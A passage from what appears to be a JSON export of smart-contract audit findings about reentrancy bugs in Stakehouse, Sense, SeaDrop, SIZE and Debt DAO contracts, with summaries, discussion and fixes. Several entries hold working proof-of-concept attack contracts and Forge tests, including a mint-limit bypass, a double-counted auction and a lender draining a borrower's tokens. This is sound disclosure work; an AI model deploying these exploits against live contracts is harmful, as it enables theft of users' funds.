      "summary": "\nA bug has been identified in the LiquidStakingManager.sol code of the 2022-11-stakehouse repository. The bug is a reentrancy vulnerability, which can be exploited to cause the loss of funds from a smart wallet. The vulnerability is present in the withdrawETHForKnot function, which allows node runners to withdraw ETH from their smart wallet. The code violates the check effect pattern, allowing a smart contract to re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned. \n\nTo prove the concept, a smart contract was added to the repository along with a test case. When the test was run, it was found that the smart contract was able to withdraw 8 ETH instead of the expected 4 ETH. \n\nThe recommended mitigation steps for this bug are to ban the public key first before sending the fund out, and to use the openzeppelin nonReentrant modifier to avoid reentrancy.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
      "sponsor_name": "Stakehouse Protocol",
      "sponsor_link": "https://twitter.com/blockswap_team",
      "quality_score": 4.333333333333333,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2022-11-stakehouse",
      "github_link": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "182",
      "slug": "h-05-reentrancy-in-liquidstakingmanagersolwithdrawethforknow-leads-to-loss-of-fund-from-smart-wallet-code4rena-stakehouse-protocol-lsd-network-stakehouse-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Stakehouse Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Stakehouse Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "3560",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "109",
      "title": "M-2: Missing ReEntrancy Guard to `claimRewards` function",
      "content": "Source: https://github.com/sherlock-audit/2022-11-sense-judging/issues/40 \n\n## Found by \n0xSmartContract\n\n## Summary\nThere is no re-entry risk on true ERC-20 tokens that work according to the spec (i.e. audited, etc.).\n\nHowever you can write a malicious ERC-20 with custom safetransferFrom() or approve() that have re-entrancy hooks to attack a target.\n\nFurthermore ERC-777 is backwards compatible token standard with ERC-20 standard. ERC-777 has better usability, but it has transfer hooks that can cause re-entrancy.\n\n\n## Vulnerability Detail\nERC20 generally doesn't result in reentrancy, however ERC777 tokens can and they can maskerade as ERC20. So if a contract interacts with unknown ERC20 tokens it is better to be safe and consider that transfers can create reentrancy problems.\n\n## Impact\nAlthough reentrancy attack is considered quite old over the past two years, there have been cases such as:\n\nUniswap/LendfMe hacks (2020) ($25 mln, attacked by a hacker using a reentrancy)\n\nThe BurgerSwap hack (May 2021) ( $7.2 million because of a fake token contract and a reentrancy exploit.)\n\nThe SURGEBNB hack (August 2021) ($4 million seems to be a reentrancy-based price manipulation attack.)\n\nCREAM FINANCE hack (August 2021) ($18.8 million, reentrancy vulnerability allowed the exploiter for the second borrow.)\n\nSiren protocol hack (September 2021) ($3.5 million, AMM pools were exploited through reentrancy attack.)\n\nType of Reentrancy\n\n[Details](https://inspexco.medium.com/cross-contract-reentrancy-attack-402d27a02a15)\n1 - Single Function Reentrancy\n2 - Cross-Function Reentrancy\n3 - Cross-Contract Reentrancy\n\n\n## Code Snippet\n\nMust be re-entrancy guard to below functions;\n\n\n[AutoRoller.sol#L654-L659](https://github.com/sherlock-audit/2022-11-sense/blob/main/contracts/src/AutoRoller.sol#L654-L659)\n\n[AutoRoller.sol#L715](https://github.com/sherlock-audit/2022-11-sense/blob/main/contracts/src/AutoRoller.sol#L715)\n\n\n```solidity\ncontracts/src/AutoRoller.sol:\n  709      /// @param coin address of the coin to transfer out.\n  710:     function claimRewards(ERC20 coin) external {\n  711:         require(coin != asset);\n  712:         if (maturity != MATURITY_NOT_SET) {\n  713:             require(coin != ERC20(address(yt)) && coin != pt && coin != ERC20(address(space)));\n  714:         }\n  715:         coin.transfer(rewardRecipient, coin.balanceOf(address(this)));\n  716:     }\n\n\ncontracts/src/AutoRoller.sol:\n  635      /// @return isExcessPTs Whether the excess token is a YT or PT.\n  636:     function eject(\n  637:         uint256 shares,\n  638:         address receiver,\n  639:         address owner\n  640:     ) public returns (uint256 assets, uint256 excessBal, bool isExcessPTs) {\n  641:         if (maturity == MATURITY_NOT_SET) revert ActivePhaseOnly();\n  642: \n  643:         if (msg.sender != owner) {\n  644:             uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n  645: \n  646:             if (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;\n  647:         }\n  648: \n  649:         (excessBal, isExcessPTs) = _exitAndCombine(shares);\n  650: \n  651:         _burn(owner, shares); // Burn after percent ownership is determined in _exitAndCombine.\n  652: \n  653:         if (isExcessPTs) {\n  654:             pt.transfer(receiver, excessBal);\n  655:         } else {\n  656:             yt.transfer(receiver, excessBal);\n  657:         }\n  658: \n  659:         asset.transfer(receiver, assets = asset.balanceOf(address(this)));\n  660:         emit Ejected(msg.sender, receiver, owner, assets, shares,\n  661:             isExcessPTs ? excessBal : 0,\n  662:             isExcessPTs ? 0 : excessBal\n  663:         );\n  664:     }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\nUse Openzeppelin or Solmate Re-Entrancy pattern\n\nHere is a example of a re-entracy guard\n\n```solidity\npragma solidity 0.8.13;\n\ncontract ReEntrancyGuard {\n    bool internal locked;\n\n    modifier noReentrant() {\n        require(!locked, \"No re-entrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n}\n```\n\n## Discussion\n\n**jparklev**\n\nAssets are not expected to re-enter and we don't think reward tokens re-entering on claimRewards would cause a problem. Nevertheless, it's a fair suggestion overall and we'll likely make this change\n\n**jparklev**\n\nFix: https://github.com/sense-finance/auto-roller/pull/19\n\n**aktech297**\n\nChanges are fine. \nI would suggest to add the reentrancy guard for eject function too.",
      "summary": "\nThis bug report is about a missing re-entrancy guard to the `claimRewards` function in the AutoRoller.sol contract. Re-entrancy is a vulnerability that can cause a contract to be attacked, leading to the loss of funds. ERC20 tokens generally do not result in re-entrancy, however ERC777 tokens can and they can masquerade as ERC20 tokens. If a contract interacts with unknown ERC20 tokens, it is better to be safe and consider that transfers can create re-entrancy problems. \n\nThere have been several high-profile hacks in the past two years that were caused by re-entrancy, such as Uniswap/LendfMe ($25 million), BurgerSwap ($7.2 million), SURGEBNB ($4 million), CREAM FINANCE ($18.8 million), and Siren Protocol ($3.5 million). \n\nThe code snippet provided shows the `claimRewards` function and the `eject` function, both of which should have re-entrancy guards. A suggested guard is provided, which is the Openzeppelin or Solmate Re-Entrancy Pattern. The changes were approved and a fix was implemented in the pull request #19. It was also suggested to add the re-entrancy guard to the `eject` function as well.",
      "report_date": {},
      "contest_prize_txt": "25333 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/19",
      "sponsor_name": "Sense",
      "sponsor_link": "",
      "quality_score": 2.3333333333333335,
      "general_score": 1,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-sense-judging/issues/40",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "19",
      "slug": "m-2-missing-reentrancy-guard-to-claimrewards-function-sherlock-sense-sense-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Sense",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Sense",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Synthetics"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "6837",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "113",
      "title": "Reentrancy of fee payment can be used to circumvent max mints per wallet check",
      "content": "## Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n`SeaDrop.sol#L586`\n\n## Description\nIn case of a `mintPublic` call, the function `_checkMintQuantity` checks whether the minter has exceeded the parameter `maxMintsPerWallet`, among other things. However, re-entrancy in the above fee dispersal mechanism can be used to circumvent the check.\n\nThe following is an example contract that can be employed by the `feeRecipient` (assume that `maxMintsPerWallet` is 1):\n\n```solidity\ncontract MaliciousRecipient {\n    bool public startAttack;\n    address public token;\n    SeaDrop public seaDrop;\n\n    fallback() external payable {\n        if (startAttack) {\n            startAttack = false;\n            seaDrop.mintPublic{value: 1 ether}({\n                nftContract: token,\n                feeRecipient: address(this),\n                minterIfNotPayer: address(this),\n                quantity: 1\n            });\n        }\n    }\n\n    // Call `attack` with at least 2 ether.\n    function attack(SeaDrop _seaDrop, address _token) external payable {\n        token = _token;\n        seaDrop = _seaDrop;\n        startAttack = true;\n        _seaDrop.mintPublic{value: 1 ether}({\n            nftContract: _token,\n            feeRecipient: address(this),\n            minterIfNotPayer: address(this),\n            quantity: 1\n        });\n        token = address(0);\n        seaDrop = SeaDrop(address(0));\n    }\n}\n```\n\nThis is especially problematic when the parameter `PublicDrop.restrictFeeRecipients` is set to `false`, in which case, anyone can circumvent the max mints check, making it a high severity issue. In the other case, only privileged users (i.e., those who should be part of `_allowedFeeRecipients[nftContract]` mapping) would be able to circumvent the check—lower severity due to the needed privileged access.\n\nAdditionally, `creatorPaymentAddress` can use re-entrancy to bypass the same check. See `SeaDrop.sol#L571`.\n\n## Recommendation\nThere are two ways to fix the above issue:\n1. Code paths that disperse the ETH as fees should have reentrancy locks set.\n2. Change `safeTransferETH` to use `.transfer` that only forwards the \"call stipend\" amount of gas to the sub-call. This may break some smart contract wallets from receiving the ETH.\n\n**OpenSea**: Added reentrancy lock (+ test), and (before this commit) mint was rearranged to be before payment. See commit `160c034`.\n\n**Spearbit**: Acknowledged.",
      "summary": "\nThis bug report is about a high-risk issue in the SeaDrop.sol#L586 code. It is possible for a fee recipient to use re-entrancy in the fee dispersal mechanism to circumvent the check that ensures the minter has not exceeded the parameter maxMintsPerWallet. The severity of the issue depends on the value of the parameter PublicDrop.restrictFeeRecipients. If it is set to false, anyone can circumvent the max mints check, making it a high severity issue. If it is set to true, only privileged users can circumvent the check, making it a lower severity issue. The same issue can be exploited by the creatorPaymentAddress as well.\n\nTo fix the issue, two solutions are suggested. The first is to set re-entrancy locks in code paths that disperse ETH as fees. The second is to use .transfer instead of safeTransferETH to forward only the \"call stipend\" amount of gas to the sub-call. This may break some smart contracts wallets from receiving the ETH. OpenSea has already added a re-entrancy lock and Spearbit has acknowledged the issue.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Seadrop-Spearbit-Security-Review.pdf",
      "pdf_page_from": 8,
      "contest_id": "",
      "slug": "reentrancy-of-fee-payment-can-be-used-to-circumvent-max-mints-per-wallet-check-spearbit-seadrop-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "SeaDrop",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "SeaDrop",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "Bypass limit"
          }
        }
      ]
    },
    {
      "id": "5825",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "116",
      "title": "[M-04] Auction created by ERC777 Tokens with tax can be stolen by re-entrancy attack",
      "content": "\nThe createAuction function lacks the check of re-entrancy. An attacker can use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. And the sum of the totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract. Finally, the attacker can take more money from the contract global pool which means stealing tokens from the other auctions and treasury.\n\n### Proof of Concept\n\nForge test\n\n    // SPDX-License-Identifier: GPL-3.0\n    pragma solidity 0.8.17;\n\n    import {Test} from \"forge-std/Test.sol\";\n\n    import {SizeSealedTest} from \"./SizeSealed.t.sol\";\n    import {ERC777} from \"openzeppelin-contracts/contracts/token/ERC777/ERC777.sol\";\n    import \"openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol\";\n    import {MockSeller} from \"./mocks/MockSeller.sol\";\n    import {MockERC20} from \"./mocks/MockERC20.sol\";\n\n    contract TaxERC777 is ERC777{\n        uint32 tax = 50; // 50% tax rate\n\n        constructor(string memory name_,\n            string memory symbol_,\n            address[] memory defaultOperators_) ERC777(name_, symbol_, defaultOperators_){}\n        \n        function mint(address rec, uint256 amount) external{\n            super._mint(rec, amount, \"\", \"\", false);\n        }\n\n        function _beforeTokenTransfer(\n            address operator,\n            address from,\n            address to,\n            uint256 amount\n        ) internal override {\n            if(to == address(0)||from==address(0)){ return;}\n            // tax just burn for test\n            \n        }\n\n        function _send(\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData,\n            bool requireReceptionAck\n        ) internal override {\n            uint tax_amount = amount* tax / 100;\n            _burn(from, tax_amount, \"\", \"\");\n            super._send(from, to, amount-tax_amount, userData, operatorData, requireReceptionAck);\n        }\n\n    }\n\n    contract Callback {\n        MockSeller seller;\n        uint128 baseToSell;\n\n        uint256 reserveQuotePerBase = 0.5e6 * uint256(type(uint128).max) / 1e18;\n        uint128 minimumBidQuote = 1e6;\n        // Auction parameters (cliff unlock)\n        uint32 startTime;\n        uint32 endTime;\n        uint32 unlockTime;\n        uint32 unlockEnd;\n        uint128 cliffPercent;\n\n        uint8 entry = 0;\n        uint128 amount_cut_tax;\n        constructor(MockSeller _seller, uint128 _baseToSell, uint256 _reserveQuotePerBase, uint128 _minimumBidQuote, uint32 _startTime, uint32 _endTime, uint32 _unlockTime, uint32 _unlockEnd, uint128 _cliffPercent){\n            seller = _seller;\n            baseToSell = _baseToSell;\n            reserveQuotePerBase = _reserveQuotePerBase;\n            minimumBidQuote = _minimumBidQuote;\n            startTime = _startTime;\n            endTime = _endTime;\n            unlockTime = _unlockTime;\n            unlockEnd = _unlockEnd;\n            cliffPercent = _cliffPercent;\n        }\n        function tokensToSend(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external{\n            if(from==address(0) || to==address(0)){return;}\n            if(entry == 0){\n                entry += 1;\n                amount_cut_tax = baseToSell / 2;\n                seller.createAuction(\n                    amount_cut_tax, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n                );\n                return;\n            }\n            else if(entry == 1){\n                entry += 1;\n                ERC777(msg.sender).transferFrom(from, to, amount_cut_tax);\n                return;\n            }\n            entry += 1;\n            return;\n            \n        }\n        function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32){return keccak256(abi.encodePacked(\"ERC1820_ACCEPT_MAGIC\"));}\n    }\n\n    contract MyTest is SizeSealedTest {\n        \n        IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);\n        function testCreateAuctionFromErc777() public {\n            TaxERC777 tax777Token;\n            address[] memory addrme = new address[](1);\n            addrme[0] = address(this);\n            tax777Token = new TaxERC777(\"t7\", \"t7\", addrme);\n            \n            seller = new MockSeller(address(auction), quoteToken, MockERC20(address(tax777Token)));\n            Callback callbackImpl = new Callback(seller, baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent);\n\n            // just without adding more function to MockSeller\n            vm.startPrank(address(seller));\n            _ERC1820_REGISTRY.setInterfaceImplementer(address(seller), keccak256(\"ERC777TokensSender\"), address(callbackImpl));\n            tax777Token.approve(address(callbackImpl), type(uint256).max);\n            vm.stopPrank();\n            seller.createAuction(\n                baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n            );\n            uint auction_balance = tax777Token.balanceOf(address(auction));\n            uint128 auction1_amount = get_auction_base_amount(1);\n            uint128 auction2_amount = get_auction_base_amount(2);\n            emit log_named_uint(\"auction balance\", auction_balance);\n            emit log_named_uint(\"auction 1 totalBaseAmount\", auction1_amount);\n            emit log_named_uint(\"auction 2 totalBaseAmount\", auction2_amount);\n            assertGt(auction1_amount+auction2_amount, auction_balance);\n        }\n\n        function get_auction_base_amount(uint id) private returns (uint128){\n            (, ,AuctionParameters memory para) = auction.idToAuction(id);\n            return para.totalBaseAmount;\n        }\n    }\n\nYou should fork mainnet because the test needs to call the ERC1820Registry contract at `0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24`\n\n    forge test --match-test testCreateAuctionFromErc777 -vvvvv --fork-url XXXXXXXX\n\nTest passed and print logs:\n\n    ...\n    ...\n        â”œâ”€ [4900] SizeSealed::idToAuction(1) [staticcall]\n        â”‚   â””â”€ â† (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 10000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))\n        â”œâ”€ [4900] SizeSealed::idToAuction(2) [staticcall]\n        â”‚   â””â”€ â† (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 5000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))\n        â”œâ”€ emit log_named_uint(key: auction balance, val: 10000000000000000000)\n        â”œâ”€ emit log_named_uint(key: auction 1 totalBaseAmount, val: 10000000000000000000)\n        â”œâ”€ emit log_named_uint(key: auction 2 totalBaseAmount, val: 5000000000000000000)\n        â””â”€ â† ()\n\n    Test result: ok. 1 passed; 0 failed; finished in 7.64s\n\n### Tools Used\n\nfoundry\n\n### Recommended Mitigation Steps\n\ncheck re-entrancy\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1308007344):**\n > Very clever, but requires such ERC777 token to exist, interoperate with ERC1820 registry and be deposited by other sellers. Does such token exist?\n\n**[RagePit (SIZE) confirmed](https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1322409870)**\n\n**[ronnyx2017 (warden) commented](https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1332282361):**\n > > Very clever, but requires such ERC777 token to exist, interoperate with ERC1820 registry and be deposited by other sellers. Does such token exist?\n> \n> Hi, thanks, just for explaining in more detail about the exploit. As it says in https://eips.ethereum.org/EIPS/eip-777, \"The token contract MUST register the ERC777Token interface with its own address via [ERC-1820](https://eips.ethereum.org/EIPS/eip-1820).\". The interface of interoperating with ERC1820 registry is built into ERC777 by default. And what the attacker need to do is registering in the ERC1820 registry for his sender/receriver address.\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the createAuction function of the SizeSealed contract. The vulnerability allows an attacker to use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. The sum of the totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract, allowing the attacker to take more money from the contract global pool.\n\nTo test this vulnerability, the foundry tool was used. The test passed and the result was ok, with 1 passed and 0 failed.\n\nTo mitigate this vulnerability, it is recommended to check for re-entrancy. This can be done by implementing a re-entrancy guard in the createAuction function.",
      "report_date": {},
      "contest_prize_txt": "$42,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-size-contest",
      "sponsor_name": "SIZE",
      "sponsor_link": "https://twitter.com/sizemarkets",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-11-size",
      "github_link": "https://github.com/code-423n4/2022-11-size-findings/issues/192",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "180",
      "slug": "m-04-auction-created-by-erc777-tokens-with-tax-can-be-stolen-by-re-entrancy-attack-code4rena-size-size-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "SIZE",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "SIZE",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC777"
          }
        }
      ]
    },
    {
      "id": "6246",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 4,
      "protocol_id": "119",
      "title": "[M-06] The lender can draw out extra credit token from borrower’s account",
      "content": "## Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488\n\n\n## Vulnerability details\n\n## Impact\nWhen the credit token is ERC20 extensive with hook, such as ERC777 token, the lender can exploit it to draw out extra tokens from borrower's account. And the 'count' state variable would also be underflowed, cause the line contract can't be 'REPAID', the borrower will never be able to get back the collateral.\n\nP.S.\nSimilar attack on imBTC https://zengo.com/imbtc-defi-hack-explained/\n\n## Proof of Concept\nThe vulnerable point is in '_close()' function,\n```\nfunction _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n    // ...\n    if (credit.deposit + credit.interestRepaid > 0) {\n        LineLib.sendOutTokenOrETH( // @audit reentrancy attack from here\n            credit.token,\n            credit.lender,\n            credit.deposit + credit.interestRepaid\n        );\n    }\n    // ...\n}\n```\n\nThe  following testcase shows how to exploit it, put it into a new LenderExploit.t.sol file under 'test' directory, it will pass\n```\npragma solidity 0.8.9;\n\nimport \"forge-std/Test.sol\";\nimport { Denominations } from \"chainlink/Denominations.sol\";\nimport { Address } from \"openzeppelin/utils/Address.sol\";\n\nimport { Spigot } from \"../modules/spigot/Spigot.sol\";\nimport { Escrow } from \"../modules/escrow/Escrow.sol\";\nimport { SecuredLine } from \"../modules/credit/SecuredLine.sol\";\nimport { ILineOfCredit } from \"../interfaces/ILineOfCredit.sol\";\nimport { ISecuredLine } from \"../interfaces/ISecuredLine.sol\";\n\nimport { LineLib } from \"../utils/LineLib.sol\";\nimport { MutualConsent } from \"../utils/MutualConsent.sol\";\n\nimport { MockLine } from \"../mock/MockLine.sol\";\nimport { SimpleOracle } from \"../mock/SimpleOracle.sol\";\nimport { RevenueToken } from \"../mock/RevenueToken.sol\";\n\n\ninterface IHook {\n    function tokensReceived(\n        address from,\n        address to,\n        uint256 amount\n    ) external;\n}\n\ncontract RevenueTokenWithHook is RevenueToken {\n    using Address for address;\n    mapping(address => bool) public registry;\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        super._afterTokenTransfer(from, to, amount);\n        if (registry[to]) {\n            IHook(to).tokensReceived(from, to, amount);\n        }\n    }\n\n    function registerHook(address addr) external {\n        registry[addr] = true;\n    }\n}\n\ncontract Attacker is IHook {\n    uint256 constant ATTACK_COUNT = 10;\n    SecuredLine line;\n    address borrower;\n    RevenueTokenWithHook token;\n    uint256 count;\n    bool attackEnable;\n    constructor(address line_, address borrower_, address token_) {\n        line = SecuredLine(payable(line_));\n        borrower = borrower_;\n        token = RevenueTokenWithHook(token_);\n        token.registerHook(address(this));\n    }\n    function tokensReceived(\n            address,\n            address,\n            uint256\n        ) external {\n        if (msg.sender != address(token)) return;\n        if (!attackEnable) return;\n        uint256 count_ = count;\n        if (count_ >= ATTACK_COUNT) return;\n        count = count_ + 1;\n        bytes32 id = line.ids(0);\n        (uint256 deposit,,,,,,) = line.credits(id);\n        token.transfer(address(line), deposit);\n        line.close(id);\n    }\n\n    function enableAttack() external {\n        attackEnable = true;\n    }\n}\n\n\ncontract ExploitCloseFunctionTest is Test {\n    uint256 constant ONE_YEAR = 365.25 days;\n    uint256 constant ATTACK_COUNT = 10;\n    Escrow escrow;\n    Spigot spigot;\n    RevenueTokenWithHook supportedToken1;\n    RevenueToken supportedToken2;\n    RevenueToken unsupportedToken;\n    SimpleOracle oracle;\n    SecuredLine line;\n    uint mintAmount = 100 ether;\n    uint MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n    uint32 minCollateralRatio = 10000; // 100%\n    uint128 dRate = 100;\n    uint128 fRate = 1;\n    uint ttl = ONE_YEAR;\n\n    address borrower;\n    address arbiter;\n    address lender;\n\n    function setUp() public {\n        borrower = address(20);\n        arbiter = address(this);\n        supportedToken1 = new RevenueTokenWithHook();\n        supportedToken2 = new RevenueToken();\n        unsupportedToken = new RevenueToken();\n\n        spigot = new Spigot(arbiter, borrower, borrower);\n        oracle = new SimpleOracle(address(supportedToken1), address(supportedToken2));\n\n        escrow = new Escrow(minCollateralRatio, address(oracle), arbiter, borrower);\n\n        line = new SecuredLine(\n          address(oracle),\n          arbiter,\n          borrower,\n          payable(address(0)),\n          address(spigot),\n          address(escrow),\n          ONE_YEAR,\n          0\n        );\n        lender = address(new Attacker(address(line), borrower, address(supportedToken1)));\n        assertEq(supportedToken1.registry(lender), true);\n        \n        escrow.updateLine(address(line));\n        spigot.updateOwner(address(line));\n        \n        assertEq(uint(line.init()), uint(LineLib.STATUS.ACTIVE));\n\n        _mintAndApprove();\n        escrow.enableCollateral( address(supportedToken1));\n        escrow.enableCollateral( address(supportedToken2));\n   \n        vm.startPrank(borrower);\n        escrow.addCollateral(1 ether, address(supportedToken2));\n        vm.stopPrank();\n    }\n\n    function testExpoit() public {\n        _addCredit(address(supportedToken1), 1 ether);\n        bytes32 id = line.ids(0);\n        vm.warp(line.deadline() - ttl / 2);\n        line.accrueInterest();\n        (uint256 deposit, , uint256 interestAccrued, , , , ) = line.credits(id);\n        uint256 lenderBalanceBefore = supportedToken1.balanceOf(lender);\n        uint256 lenderBalanceAfterExpected = lenderBalanceBefore + deposit + interestAccrued;\n\n        Attacker(lender).enableAttack();\n        hoax(lender);\n        line.close(id);\n        vm.stopPrank();\n        uint256 lenderBalanceAfter = supportedToken1.balanceOf(lender);\n        assertEq(lenderBalanceAfter, lenderBalanceAfterExpected + interestAccrued * ATTACK_COUNT);\n        (uint256 count,) = line.counts();\n        assertEq(count, MAX_INT - ATTACK_COUNT + 1);\n    }\n\n\n    function _mintAndApprove() internal {\n        deal(lender, mintAmount);\n\n        supportedToken1.mint(borrower, mintAmount);\n        supportedToken1.mint(lender, mintAmount);\n        supportedToken2.mint(borrower, mintAmount);\n        supportedToken2.mint(lender, mintAmount);\n        unsupportedToken.mint(borrower, mintAmount);\n        unsupportedToken.mint(lender, mintAmount);\n\n        vm.startPrank(borrower);\n        supportedToken1.approve(address(escrow), MAX_INT);\n        supportedToken1.approve(address(line), MAX_INT);\n        supportedToken2.approve(address(escrow), MAX_INT);\n        supportedToken2.approve(address(line), MAX_INT);\n        